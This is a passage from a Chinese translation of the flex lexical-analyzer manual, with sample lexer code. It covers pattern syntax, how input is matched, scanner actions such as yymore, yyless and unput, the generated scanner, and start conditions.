匹配一次或多次。</p></li><li><p><code>r?</code>  </p><p>  匹配零次或一次。</p></li><li><p><code>r{2,5}</code>  </p><p>  {n,m}, m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</p></li><li><p><code>r{2,}</code> </p><p>  {n,}, n 是一个非负整数。至少匹配n 次。</p></li><li><p><code>r{4}</code> </p><p>  {n}, n 是一个非负整数。匹配确定的 n 次。</p></li><li><p><code>{name}</code>  </p><p>  name定义的扩展，查看<a href="http://westes.github.io/flex/manual/Format.html#Format" target="_blank" rel="noopener">format</a></p></li><li><p>‘“[xyz]&quot;foo”’</p><p>  the literal string: ‘[xyz]”foo’</p></li><li><p>‘\X’  </p><p>  if X is ‘a’, ‘b’, ‘f’, ‘n’, ‘r’, ‘t’, or ‘v’, then the ANSI-C interpretation of ‘\x’. Otherwise, a literal ‘X’ (used to escape operators such as ‘*’)</p></li><li><p><code>\0</code> </p><p>  匹配NULL(ascii code 0)</p></li><li><p><code>\123</code> </p><p>  匹配八进制值为123的字符</p></li><li><p><code>\x2a</code> </p><p>  匹配16进制值为2a的字符</p></li><li><p><code>(r)</code>   </p><p>  match <code>r</code>；括号用于提高优先级</p></li><li><p><code>(?r-s:pattern)</code><br>  :之后的是使用的pattern，而使用r并略去s对pattern进行解释<br>  r和s这两个参数可以为空或者<code>i</code> <code>s</code> <code>x</code><br>  i表示大小写不敏感 -i表示大小写不敏感<br>  s表示通过<code>.</code>匹配单字节的任意字符, -s表示<code>.</code>匹配\n之外的任何字节(译者注:其实就是用s来指明<code>.</code>的意思)<br>  x会忽略注释和空白符，除非空格被反斜杠转义，或者包含在””中或者出现在前面所说的字符类里，否则将被忽略<br>  以下表达式都是合法的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(?:foo)         same as  (foo)</span><br><span class="line">(?i:ab7)        same as  ([aA][bB]7)</span><br><span class="line">(?-i:ab)        same as  (ab)</span><br><span class="line">(?s:.)          same as  [\x00-\xFF]</span><br><span class="line">(?-s:.)         same as  [^\n]</span><br><span class="line">(?ix-s: a . b)  same as  ([Aa][^\n][bB])</span><br><span class="line">(?x:a  b)       same as  (&quot;ab&quot;)</span><br><span class="line">(?x:a\ b)       same as  (&quot;a b&quot;)</span><br><span class="line">(?x:a&quot; &quot;b)      same as  (&quot;a b&quot;)</span><br><span class="line">(?x:a[ ]b)      same as  (&quot;a b&quot;)</span><br><span class="line">(?x:a</span><br><span class="line">    &#x2F;* comment *&#x2F;</span><br><span class="line">    b</span><br><span class="line">    c)          same as  (abc)</span><br></pre></td></tr></table></figure></li><li><p><code>(?# comment )</code>  </p><p>  忽略任何在()里的字符</p></li><li><p><code>rs</code>  </p><p>  将r和s两个正则表达式相串联 (不是很懂)</p></li><li><p><code>r|s</code> </p><p>  用r或s去匹配,并联的意思。</p></li><li><p><code>r/s</code><br>  匹配r，但是r之后必须有s，确定此规则为最长匹配项时包括s，但是在返回文本时只返回r。</p></li><li><p><code>^r</code><br>  只在一行的开头去匹配r(即，刚开始扫描时或在扫描到换行符之后)</p></li><li><p><code>r$</code><br>  在一行的结尾去匹配r</p></li><li><p><code>&lt;s&gt;r</code><br>  在start condition为s的时候才用r匹配;</p></li><li><p><code>&lt;s1,s2,s3&gt;r</code></p><p>  start condition为s1或s2或s3时才用r匹配;</p></li><li><p><code>&lt;*&gt;r</code>    </p><p>  在任何start condition都可以用r匹配</p></li><li><p><code>&lt;&lt;EOF&gt;&gt;</code> </p><p>  匹配EOF(文件结束)</p></li><li><p><code>&lt;s1,s2&gt;&lt;&lt;EOF&gt;&gt;</code></p><p>  在start condition为s1和s2的时候,匹配EOF</p></li></ul><p>注意一下在字符集合里，所有的正则表达式的operator丢失了他们的特殊意义，除了’\‘   ‘-‘   ‘]]’和在集合前面的’^’</p><p>上面所有提到的正则表达式都被根据优先级从最高到最低来组织，那些被分组到一起的是具有相同优先级的(在–posix 遵从POSIX标准的参数的文档中关于repeat operator ‘{}’优先级的特殊标记) 例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo|bar*</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(foo)|(ba(r*))</span><br></pre></td></tr></table></figure><p>因为<code>*</code>操作符比串联有更高的优先级，串联比并联(<code>|</code>)更高的优先级。</p><p>因此这个pattern匹配的是字符串”foo”或者”ba”后面跟着0或多个满足r的字符串</p><p>为了匹配’foo’或者0或多个”bar” 可以这么写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo|(bar)*</span><br></pre></td></tr></table></figure><p>或者为了匹配0个或多个”foo或bar”，可以写成这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(foo|bar)*</span><br></pre></td></tr></table></figure><ul><li><p><code>{-}</code>这个是求差集的operator，他会计算两个character class的差集</p><p>  例如<code>[a-c]{-}[b-z]</code> 会匹配在a-c里不在b-z里的字符</p></li><li><p><code>{+}</code>是求并集的operator，他会计算两个character class的并集</p><p>  例如在“C”的运行环境中<code>[[:alpha:]]{-}[[:lower:]]{+}[q]</code>这个和<code>[A-Zq]</code>是等价的</p></li><li><p>一条规则最多可以包含一个尾随上下文实例(“/”运算符或“$”运算符)。起始条件“^”和“&lt;<EOF>&gt;”模式只能出现在模式的开头，并且不能与“/”和“$”一起放在括号内。规则开头没有出现的“^”或规则结尾没有出现的“$”将失去其特殊属性，并被视为普通字符。</p></li></ul><ul><li><p>以下表达式是不合法的:<br>  第一句可以被写成这样<code>foo/bar\n</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo&#x2F;bar$</span><br><span class="line"> &lt;sc1&gt;foo&lt;sc2&gt;bar</span><br></pre></td></tr></table></figure></li><li><p>以下情况$或者^会被忽略，当作一个普通字符</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo|(bar$)</span><br><span class="line"> foo|^bar</span><br></pre></td></tr></table></figure><p>如果你希望匹配的是’foo’或者’bar’后接一个新行，可以这么写，一个小trick将work。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo      |</span><br><span class="line"> bar$     &#x2F;* action goes here *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="7-How-the-Input-Is-Matched"><a href="#7-How-the-Input-Is-Matched" class="headerlink" title="7 How the Input Is Matched"></a>7 How the Input Is Matched</h2><p>生成的扫描程序(scanner)运行的时候，它会分析输入来寻找与模式(pattern)匹配的字符串。如果找到多个匹配字符串，它会匹配文本最多的那一个(for trailing context rules，包括trailing部分的长度)。如果找到多个长度相同的匹配字符串，则按照flex输入文件中最先列出的规则选择。</p><p>一旦确定匹配，就在全局字符指针yytext中提供与该匹配相对应的文本(称为token)，并在全局int变量yyleng中提供长度。然后执行与匹配模式(pattern)相对应的操作(action)，然后扫描剩余的输入寻找下一个匹配。</p><p>如果找不到匹配，则执行默认规则：下一个输入的字符将被视为匹配并复制到标准输出中。因此，最简单的有效flex输入是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br></pre></td></tr></table></figure><p>其生成一个扫描程序(scanner)将输入(一次一个字符)简单地复制到输出。</p><p>注意yytext可以用两种方式定义：作为字符指针或者字符数组。你可以通过在你的flex输入的开头(定义)部分包含<code>%pointer</code> 或<code>%array</code>中的一个来控制flex使用哪一个定义。</p><p>默认是<code>%pointer</code>，除非使用<code>&#39;-l&#39;</code>lex兼容性选项，在这种情况下yytext就是一个数组。使用<code>％pointer</code>的好处是在匹配非常大的token时(除非您用尽了动态内存)，扫描速度明显加快，并且没有缓冲区溢出，缺点是在修改yytext方面，你的action将受到限制(参考<a href="http://westes.github.io/flex/manual/Actions.html#Actions" target="_blank" rel="noopener">action</a>)，而且对<code>unput()</code>函数的调用会破坏yytext的当前内容，这在不同lex版本之间移动的时候可能会有很大的麻烦。</p><p>使用<code>%array</code>的好处在于你可以修改yytext为你想要的内容，而且调用<code>unput()</code>不会破坏yytext。此外，现有的lex程序有时会使用以下形式的声明从外部访问yytext：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern char yytext[];</span><br></pre></td></tr></table></figure><p>这个声明在使用<code>%pointer</code>时是错误的，但在使用<code>%array</code>时是正确的。</p><p><code>％array</code>声明将yytext定义为YYLMAX个字符的数组，YYLMAX默认为相当大的值，你可以在flex输入的第一部分中简单的#define YYLMAX为另一个值来更改它的大小。如上所述，使用<code>%pointer</code>时yytext会动态地增长来容纳很大的token。即你的<code>%pointer</code>扫描程序(scanner)可以容纳非常大的token(例如匹配整个注释块)，但请记住每次扫描器必须重新调整yytext的大小时，还必须从头开始重新扫描整个token，因此匹配这种token可能会很慢。<br>如果调用unput()导致太多文本被push back，则yytext目前不会动态增长，而是会导致运行时错误。</p><p>另外注意，不能将<code>％array</code>与C++扫描程序(scanner)类一起使用(参考<a href="http://westes.github.io/flex/manual/Cxx.html#Cxx" target="_blank" rel="noopener">Cxx</a>)。</p><h2 id="8-Actions"><a href="#8-Actions" class="headerlink" title="8 Actions"></a>8 Actions</h2><p>规则中的每个pattern都有一个相应的action, 这些action可以是任意的c语言.</p><p>Pattern以第一个非转义的空字符结束; 这一行剩下的部分就是它的action.</p><p>如果这个action是空的,那么当pattern进行匹配时, 它的input token就会被简单的丢弃.</p><p>例如, 下面是一个程序的rule, 它从输入中删除了所有出现的”zap me”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">&quot;zap me&quot;</span><br></pre></td></tr></table></figure><p>这个示例将输入中的所有其他字符复制到输出中, 因为这些其他字符将由默认规则匹配.</p><p>下面是一个程序, 它将多个空格和制表符(tabs)压缩到单个的空白(blank), 并丢弃行尾的空格:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">[ \t]+        putchar( &#39; &#39; );</span><br><span class="line">[ \t]+$       &#x2F;* ignore this token *&#x2F;</span><br></pre></td></tr></table></figure><p>如果这个action包含<code>&quot;{&quot;</code>, 那么该action将一直持续到找到<code>&quot;}&quot;</code>, 并且这个操作可能会跨越几行. </p><p>flex明白C的strings和注释, 所以flex不会因为字符串和注释里面的大括号而上当. 并且flex允许action以<code>&#39;%{&#39;</code>开头的操作,并将该action视为<code>&quot;%}&quot;</code>之前的所有文本(而不管action中出现的普通大括号).</p><p>一个仅包括竖线<code>&quot;|&quot;</code>的action表示与下一个action的规则(rule)相同。可见于下面的例证.</p><p>Actions可以包括任意的C代码,包括<code>return</code>语句–将一个值返回给任何调用<code>yylex()</code>的程序.每次调用<code>yylex()</code>,它将从上次中断的地方继续处理token,直到文件的末尾或者执行返回.</p><p>Actions可以自由地修改<code>yytext</code>,除了延长它的长度(向其末尾增加字符––这样会覆盖输入流中后面的字符). 但是,使用<code>%array</code>的情况不适用于此(请参考Matching).在这种情况下,可以任意修改<code>yytext</code>.</p><p>Actions可以自由地修改<code>yyleng</code>,但是如果action还包括<code>yymore()</code>的使用,则不应该修改<code>yyleng</code>(见下文).</p><p>这里有许多特殊的指令(directives),这些指令可以被用于action中:</p><ul><li><p>ECHO<br>   拷贝yytext到scanner的输出</p></li><li><p>BEGIN<br>   紧随其后的是开始条件的名称,将scanner置于相应的开始条件中(见下文)</p></li><li><p>yymore()<br>   告诉scanner,下次它匹配规则时,应该将对应的token加到<code>yytext</code>的当前值上,不是替换它.例如,给定输入为<code>&#39;mega-kludge&#39;</code>,下面的输出将写入<code>mega-mega-kludge’</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">mega-    ECHO; yymore();</span><br><span class="line">kludge   ECHO;</span><br></pre></td></tr></table></figure><p>这是关于<code>yymore()</code>的两个说明.<br>首先,<code>yymore()</code>取决于<code>yyleng</code>的值,它正确的反应了当前token的大小,所以如果使用<code>yymore()</code>则不能修改<code>yyleng</code>.<br>其次,scanner的action中存在<code>yymore()</code>会对scanner的匹配速度造成轻微的性能损失.</p></li><li><p>yyless(n)<br>   除了当前token的前n个字符,将剩下的字符返回到输入流,当scanner查找下一个匹配时,这些字符将被重新查找.对于<code>yytext</code>和<code>yyleng</code>做了一些适当地调整(例如,<code>yyleng</code>现在等于n).例如,在输入<code>&#39;foobar&#39;</code>,下面将输出<code>&#39;foobarbar&#39;</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">foobar    ECHO; yyless(3);</span><br><span class="line">[a-z]+    ECHO;</span><br></pre></td></tr></table></figure><p>将0作为参数传入<code>yyless()</code>将导致再次扫描当前输入的字符串.除非您已经改变了scanner处理输入的方式(例如使用了<code>BEGIN</code>),否则这将导致一个死循环.<br>注意,<code>yyless()</code>是一个宏,只能在flex输入文件中使用,而不能从其他源文件中使用.</p></li><li><p>unput(c)<br>   将字符<code>c</code>放回输入流.这将是下一个字符扫描.下面的action将使用当前的token,进行重新扫描,并用括号闭合。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">&#x2F;* Copy yytext because unput() trashes yytext *&#x2F;</span><br><span class="line">char *yycopy &#x3D; strdup( yytext );</span><br><span class="line">unput( &#39;)&#39; );</span><br><span class="line">for ( i &#x3D; yyleng - 1; i &gt;&#x3D; 0; --i )</span><br><span class="line">    unput( yycopy[i] );</span><br><span class="line">unput( &#39;(&#39; );</span><br><span class="line">free( yycopy );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意,由于每个<code>unput()</code>都将给定的字符放回输入流的开头,所以必须由后向前插入字符串.</p><p>使用<code>unput</code>时的一个重要的潜在问题是,如果使用<code>%pointer</code>(默认),调用<code>unput()</code>会破坏<code>yytext</code>的内容,从其最右边的字符开始，并在每次调用时向左吞噬一个字符。如果你需要在调用<code>unput()</code>后保留<code>yytext</code>的值(如上面的示例所示),则必须先将它复制到其他地方,或者使用<code>%array</code>构建scanner(参见<a href="http://westes.github.io/flex/manual/Matching.html#Matching" target="_blank" rel="noopener">Matching</a>).</p><p>最后,请注意,不能将<code>&#39;EOF&#39;</code>插入(push back)来尝试用文件结束来标记输入流.</p><ul><li>input()<br>   从输入流读取下一个字符.例如,以下是清除C注释的一种方法:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">  &quot;&#x2F;*&quot;        &#123;</span><br><span class="line">              int c;</span><br><span class="line"></span><br><span class="line">              for ( ; ; )</span><br><span class="line">                  &#123;</span><br><span class="line">                  while ( (c &#x3D; input()) !&#x3D; &#39;*&#39; &amp;&amp;</span><br><span class="line">                          c !&#x3D; EOF )</span><br><span class="line">                      ;    &#x2F;* eat up text of comment *&#x2F;</span><br><span class="line"></span><br><span class="line">                  if ( c &#x3D;&#x3D; &#39;*&#39; )</span><br><span class="line">                      &#123;</span><br><span class="line">                      while ( (c &#x3D; input()) &#x3D;&#x3D; &#39;*&#39; )</span><br><span class="line">                          ;</span><br><span class="line">                      if ( c &#x3D;&#x3D; &#39;&#x2F;&#39; )</span><br><span class="line">                          break;    &#x2F;* found the end *&#x2F;</span><br><span class="line">                      &#125;</span><br><span class="line"></span><br><span class="line">                  if ( c &#x3D;&#x3D; EOF )</span><br><span class="line">                      &#123;</span><br><span class="line">                      error( &quot;EOF in comment&quot; );</span><br><span class="line">                      break;</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure></li></ul><p>(请注意,如果scanner是使用c++编译的,那么<code>input()</code>将被替换为<code>yyinput()</code>,以避免产生与c++流名字冲突的情况.</p><ul><li><p>YY_FLUSH_BUFFER<br>   刷新scanner的内部缓冲区,以便下次scanner尝试匹配token,它将首先使用<code>YY_INPUT()</code>填充缓冲区(参见<a href="http://westes.github.io/flex/manual/Generated-Scanner.html#Generated-Scanner" target="_blank" rel="noopener">Generated Scanner</a>.这个action是比<code>yy_flush_buffer</code>函数更通用的特例.如下所述(参见 <a href="http://westes.github.io/flex/manual/Multiple-Input-Buffers.html#Multiple-Input-Buffers" target="_blank" rel="noopener">Multiple Input Buffers</a>)</p></li><li><p>yyterminate()<br>   可以用来代替action中的返回语句.它终止scanner并将0返回给scanner的调用者,指示”全部完成”.默认情况下,当遇到文件结束,也会调用<code>yyterminate()</code>.它是一个宏,可以重新定义.</p></li></ul><h2 id="9-The-Generated-Scanner"><a href="#9-The-Generated-Scanner" class="headerlink" title="9 The Generated Scanner"></a>9 The Generated Scanner</h2><p>flex的输出是lex.yy.c,包括扫描程序(scanning routine) yylex(),许多用于匹配token的表，一些辅助函数和宏定义。<br>默认yylex()函数被声明如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int yylex()</span><br><span class="line">    &#123;</span><br><span class="line">    ... various definitions and the actions in here ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是我们可以通过一个宏定义来改变它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define YY_DECL float lexscan( a, b ) float a, b;</span><br></pre></td></tr></table></figure><p>这代表另scanning routine名为lexscan，并包括两个float类型的参数和返回一个float类型的变量。<br>此外flex创建的程序遵循c99标准。<br>每次yylex调用，都会从全局输入yyin(默认为stdin)中顺序扫描token，直到到达文件末尾(此时返回0)，或者遇到一个执行”return”语句的action。<br>如果scanner到达文件末尾，则后续调用是不确定的。<br>既可以将yyin指向新的输入文件(在这种情况下，扫描将从该文件继续进行)，也可以调用yyrestart()函数。<br>yyrestart()接受一个参数，一个FILE *指针(这个指针可能是NULL，如果你已经设置了YY_INPUT宏从其他地方读取，而不是从yyin)，然后它将初始化yyin，用于从这个文件(FILE *)继续扫描。<br>这两种方法之间基本上没有区别。<br>后者可以兼容早期版本的flex，因为它可以用于在扫描的过程中就切换输入文件；通过将yyin传递给yyrestart，调用这个函数，也可以用来丢弃当前的input buffer，但是最好还是使用YY_FLUSH_BUFFER。<br>请注意，yyrestart()不会将开始条件重置为INITIAL<br>如果yylex()由于在某个action上执行了return而停止扫描，则可以再次调用scanner，并且它将从中断处继续扫描。<br>默认情况下(为了提高效率)，scanner使用块读取而不是简单的getc()调用来读取字符y，可以通过定义YY_INPUT宏来控制如何获取输入。<br>YY_INPUT() is YY_INPUT(buf,result,max_size)，它用于在buf数组里放置最多max_size个字节，并且在整数变量result中，记录读取的字节数量或者YY_NULL(在Unix系统上值为0)，YY_NULL是为了表示遇到EOF。<br>YY_INPUT默认从yyin中读取。<br>下面是一个简单的例子，在输入文件的define部分的示例定义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#define YY_INPUT(buf,result,max_size) \</span><br><span class="line">    &#123; \</span><br><span class="line">    int c &#x3D; getchar(); \</span><br><span class="line">    result &#x3D; (c &#x3D;&#x3D; EOF) ? YY_NULL : (buf[0] &#x3D; c, 1); \</span><br><span class="line">    &#125;</span><br><span class="line">%&#125;</span><br></pre></td></tr></table></figure><p>此定义会将输入处理更改为一次读取一个字符。<br>当scanner从YY_INPUT接收到EOF时，它将使用yywrap()函数进行检查。如果yywrap()返回false(零)，则假定该函数已进行设置y指向另一个输入文件，然后继续扫描。<br>如果返回true(非零)，则scanner终止，并向其调用方返回0。<br>请注意，无论哪种情况，start condition均保持不变；它并没有恢复 INITIAL。<br>如果您没有提供自己的版本yywrap()，则必须使用%option noyywrap(在这种情况下，scanner的行为就像yywrap()返回1)，或者您必须链接“-lfl’来获取默认的yywrap版本，该版本始终返回1。<br>关于从内存缓冲区扫描(例如 scanning string)，在Scanning Strings和Multiple Input Buffers部分。<br>scanner将写入它的ECHO输出到yyout global(默认为stdout)，用户只需将其分配给其他FILE指针即可重新定义。</p><h2 id="10-Start-Conditions"><a href="#10-Start-Conditions" class="headerlink" title="10 Start Conditions"></a>10 Start Conditions</h2><p>flex提供了有条件的激活规则机制，任何以<code>&lt;sc&gt;</code>前缀的pattern，仅在scanner处于名为sc的开始状态时，才处于活动状态。<br>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;STRING&gt;[^&quot;]*        &#123; &#x2F;* eat up the string body ... *&#x2F;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这个pattern将被激活，仅当scanner处于STRING状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;INITIAL,STRING,QUOTE&gt;\.        &#123; &#x2F;* handle an escape ... *&#x2F;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这个pattern将被激活，仅当scanner处于INITIAL,STRING或QUOTE状态</p><p>可以使用%s和%x来定义两种特殊的start condition。<br>一个开始条件被激活，通过BEGIN action。在执行下一个BEGIN action之前，具有给定开始条件的规则将处于活动状态，而具有其他开始条件的规则将处于非活动状态</p><p>包容性(inclusive)的启动条件<br>如果启动条件是inclusive的，则完全没有给出sc限定的规则也将处于活动状态。</p><p>排他性(exclusive)的启动条件<br>如果是排他性的，则只有符合开始条件的规则才是活动的。<br>一组基于相同排他开始条件的规则描述了一个扫描程序，该扫描程序独立于以下任何其他来自flex input的规则。<br>因此，排它的启动条件使指定”mini-scanners”变得容易，该”mini-scanners”将扫描输入中与其余语法(例如，注释)不同的部分。</p><p>如果上述描述有点模糊，考虑以下例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%s example</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">&lt;example&gt;foo   do_something();</span><br><span class="line"></span><br><span class="line">bar            something_else();</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%x example</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">&lt;example&gt;foo   do_something();</span><br><span class="line"></span><br><span class="line">&lt;INITIAL,example&gt;bar    something_else();</span><br></pre></td></tr></table></figure><p>如果没有<code>&lt;INITIAL,example&gt;</code>限定符，则bar第二个示例中的pattern在启动条件处于example时，将不会处于活动状态(即无法匹配)。<br>但是，如果我们仅用<code>&lt;example&gt;</code>限定条件bar，那么它将仅在处于example时被激活而不在处于INITIAL时被激活。<br>而在第一个示例中它同时在两个中都起作用。<br>(译者注：排他是在已经进入了某个sc时的排他，包容也是在某个sc里的包容)</p><p>还要注意，特殊的启动条件说明符<code>&lt;*&gt;</code>匹配每个启动条件。因此，上面的示例也可以写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">％x example</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">&lt;example&gt; foo do_something();</span><br><span class="line"></span><br><span class="line">&lt;*&gt; bar something_else();</span><br></pre></td></tr></table></figure><p>The default rule (to ECHO any unmatched character) remains active in start conditions. It is equivalent to:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;*&gt;.|\n     ECHO;</span><br></pre></td></tr></table></figure><p>BEGIN(0)返回到没有开始条件被激活的初始状态。<br>此状态也可以称为INITIAL，因此BEGIN(INITIAL)等效于BEGIN(0)。(在开始条件名称周围的括号不是必需的，但是被认为是很好的样式)</p><p>BEGIN动作也可以在规则部分的开头以缩进代码的形式给出。例如，以下内容将导致scanner进入SPECIAL开始状态，当每次yylex()被调用且全局变量enter_special为true。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        int enter_special;</span><br><span class="line"></span><br><span class="line">%x SPECIAL</span><br><span class="line">%%</span><br><span class="line">        if ( enter_special )</span><br><span class="line">            BEGIN(SPECIAL);</span><br><span class="line"></span><br><span class="line">&lt;SPECIAL&gt;blahblahblah</span><br><span class="line">...more rules follow...</span><br></pre></td></tr></table></figure><p>为了说明开始条件的用法，下面是一个scanner，它提供了两种不同的字符串解释，例如’123.456’。<br>默认情况下，它将视为三个token，即整数’123’，点(‘.’)和整数’456’。<br>但是，如果该行字符串的前缀是’expect-floats’,它会将其视为单个令牌，即浮点数’123.456’：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">    #include &lt;math.h&gt;</span><br><span class="line">    %&#125;</span><br><span class="line">    %s expect</span><br><span class="line"></span><br><span class="line">    %%</span><br><span class="line">    expect-floats        BEGIN(expect);</span><br><span class="line"></span><br><span class="line">    &lt;expect&gt;[0-9]+.[0-9]+      &#123;</span><br><span class="line">                printf( &quot;found a float, &#x3D; %f\n&quot;,</span><br><span class="line">                        atof( yytext ) );</span><br><span class="line">                &#125;</span><br><span class="line">    &lt;expect&gt;\n           &#123;</span><br><span class="line">                &#x2F;* that&#39;s the end of the line, so</span><br><span class="line">                 * we need another &quot;expect-number&quot;</span><br><span class="line">                 * before we&#39;ll recognize any more</span><br><span class="line">                 * numbers</span><br><span class="line">                 *&#x2F;</span><br><span class="line">                BEGIN(INITIAL);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">    [0-9]+      &#123;</span><br><span class="line">                printf( &quot;found an integer, &#x3D; %d\n&quot;,</span><br><span class="line">                        atoi( yytext ) );</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">    &quot;.&quot;         printf( &quot;found a dot\n&quot; );</span><br></pre></td></tr></table></figure><p>下面是一个scanner，其可以在保持当前输入行计数的同时，识别并丢弃掉注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%x comment</span><br><span class="line">%%</span><br><span class="line">        int line_num &#x3D; 1;</span><br><span class="line"></span><br><span class="line">&quot;&#x2F;*&quot;         BEGIN(comment);</span><br><span class="line"></span><br><span class="line">&lt;comment&gt;[^*\n]*        &#x2F;* eat anything 